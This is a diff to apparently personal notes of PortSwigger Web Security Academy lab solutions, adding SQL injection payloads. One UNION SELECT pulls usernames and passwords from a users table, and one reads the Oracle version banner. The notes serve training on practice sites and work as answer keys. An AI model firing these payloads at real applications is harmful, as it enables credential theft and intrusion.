@@ -1,3 +1,8 @@
 [lab: SQL injection UNION attack, retrieving multiple values in a single column]
 url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
 solution: https://ac981f241f895a09809e911400b6010f7.web-security-academy.net/filter?category=Corporate+gifts' union select null,username || '<->'|| password from users--
+
+[lab: SQL injection attack, querying the database type and version on Oracle]
+url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+solution: https://acb51f961f942ea980fa01b60065006d.web-security-academy.net/filter?category=Corporate+gifts' UNION SELECT null,banner FROM v$version--
+
